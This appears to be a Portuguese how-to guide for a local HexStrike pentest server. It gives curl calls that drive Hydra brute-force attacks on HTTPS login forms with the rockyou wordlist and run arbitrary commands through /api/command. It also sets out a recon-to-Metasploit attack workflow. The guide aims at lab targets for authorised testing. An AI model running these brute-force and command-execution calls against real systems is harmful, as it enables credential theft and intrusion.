GUIA HEXSTRIKE — TODAS AS FERRAMENTAS

Servidor: http://127.0.0.1:8888 · Método: POST + JSON · Alvo dos exemplos: sempre local/laboratório (127.0.0.1, 10.0.0.x) — substitua pelo alvo autorizado do seu teste.

Regra de ouro: cada rota aceita campos JSON específicos. Antes de inventar campos, descubra a implementação real: 
grep -n "api/tools/NOME" hexstrike_server.py
sed -n 'LINHA,LINHA+40p' hexstrike_server.py

Listar TODAS as rotas disponíveis na SUA versão do servidor (o HexStrike tem dezenas de rotas — use isto para descobrir todas e montar o JSON certo): 

grep -nE '@app\.route' hexstrike_server.py
grep -nE 'def api_' hexstrike_server.py | head -200

Base — verificar servidor e listar rotas

curl -s http://127.0.0.1:8888/health
grep -nE '@app\.route' ~/cerebrocaine/hexstrike-ai/hexstrike_server.py | head -100
curl -s -X POST http://127.0.0.1:8888/api/command \
  -H "Content-Type: application/json" \
  -d '{"command":"echo teste"}'

7. Hydra — brute force de login web HTTP/HTTPS

credenciaishttps

Regra: para HTTPS use https-post-form / https-get (ou http-post-form com -S, que força TLS na 443). A sintaxe do formulário é /caminho:parametros:condicao, com ^USER^ e ^PASS^ nas posições dos campos.

curl -sS -X POST http://127.0.0.1:8888/api/tools/hydra \
  -H "Content-Type: application/json" \
  -d '{"target":"10.0.0.5","service":"https-post-form","port":"443","username":"admin","password_file":"/usr/share/wordlists/rockyou.txt","additional_args":"/login:username=^USER^&password=^PASS^&btnLogin=Login:F=invalid -t 8 -f -V"}'

HTTP Basic Auth em HTTPS (popup do navegador — usa https-get):

curl -sS -X POST http://127.0.0.1:8888/api/tools/hydra \
  -H "Content-Type: application/json" \
  -d '{"target":"10.0.0.5","service":"https-get","port":"443","username":"admin","password_file":"/usr/share/wordlists/rockyou.txt","additional_args":"/admin/ -t 8 -f"}'

Certificado self-signed / TLS inválido: adicione -K (ignora certificado):

curl -sS -X POST http://127.0.0.1:8888/api/tools/hydra \
  -H "Content-Type: application/json" \
  -d '{"target":"10.0.0.5","service":"https-post-form","port":"443","username":"admin","password_file":"/tmp/pass.txt","additional_args":"/login:user=^USER^&pass=^PASS^:F=failed -K -t 4"}'

Como descobrir os parâmetros reais do formulário (não invente):

# 1. Abra a pagina de login e faca um login errado de proposito
# 2. Capture a requisicao POST no DevTools (aba Network) ou Burp
# 3. Anote: caminho, nomes dos campos, mensagem de erro exibida
# 4. Monte: /caminho:campo1=^USER^&campo2=^PASS^:F=mensagem_de_erro
# 5. Se o sucesso redireciona, use S=302 em vez de F=

Flags: -t threads (4–8) · -f para ao achar · -V verboso · -S força SSL/TLS · -K ignora certificado inválido · S= condição de sucesso · F= condição de falha. Cookie de sessão pré-obtido: H=Cookie\: session=SEU_COOKIE. Wordlist pequena primeiro; rockyou inteiro estoura o timeout de 300s do server.

NOVAS SEÇÕES — foco HTTP/HTTPS e web

17. Burp Suite — proxy de interceptação (o "canivete" web)

webproxy

O Burp é uma GUI: o HexStrike normalmente não tem rota dedicada a ele, mas você pode iniciar o proxy pelo /api/command e usar o Burp manualmente apontando o navegador para ele.

curl -sS -X POST http://127.0.0.1:8888/api/command \
  -H "Content-Type: application/json" \
  -d '{"command":"burpsuite &"}'
curl -sS -X POST http://127.0.0.1:8888/api/command \
  -H "Content-Type: application/json" \
  -d '{"command":"burpsuite --project-file=/tmp/lab.burp --config-file=/tmp/user_options.json &"}'

Fluxo típico em lab: navegador → proxy 127.0.0.1:8080 → interceptar requisição de login → botão direito Copy to file → usar essa requisição no SQLmap (-r /tmp/req.txt) ou montar o https-post-form do Hydra com os campos reais. O Burp também tem Intruder (brute force comToken de CSRF rotativo via pitchfork) e Repeater (testar payloads manualmente).

Workflow completo — recon até exploit (ordem recomendada)

1. Nmap -sV        -> quais portas/servicos existem
2. Nmap --script   -> vulnerabilidades conhecidas dos servicos
3. Amass/Subfinder -> subdominios e superficie externa
4. HTTPX           -> quais hosts tem web viva
5. WhatWeb/WafW00f -> tech stack e presenca de WAF
6. Dirb/FFUF/Gobuster -> diretorios e endpoints escondidos
7. Nikto/Nuclei    -> misconfigurations e CVEs web
8. Burp Suite      -> interceptar login, pegar campos reais
9. SQLmap          -> testar parametros para injecao
10. Hydra/Medusa   -> brute force de login HTTPS (com autorizacao)
11. John/Hashcat   -> hashes capturados em lab
12. Metasploit     -> exploit confirmado com versao vulneravel

Dicas gerais

  • Timeout do server é 300s: tarefas longas (rockyou inteiro, amass full) estouram. Rode em chunks ou direto no terminal.
  • Ferramenta ausente: a resposta vem com erro no stderr. Confira com command -v ferramenta e instale.
  • Cache: requisições idênticas podem vir do cache; adicione um parâmetro variável ou limpe o cache via /api/cache/stats para testes repetidos.
  • Monitoramento: GET /api/processes/list mostra processos em execução; POST /api/processes/terminate/<pid> encerra.
  • Rota inexistente: se /api/tools/gobuster (ou outra) não existir na sua versão, rode via /api/command chamando o binário direto — o grep do topo mostra o que o seu server tem.
  • CSRF token rotativo quebra Hydra/Medusa: nesse caso use o Intruder do Burp (pitchfork com macro) ou script Python com requests que busca o token a cada tentativa.
  • Escopo: todos os exemplos apontam para localhost/lab. Substituir o alvo sem autorização explícita é ilegal em quase toda jurisdição.
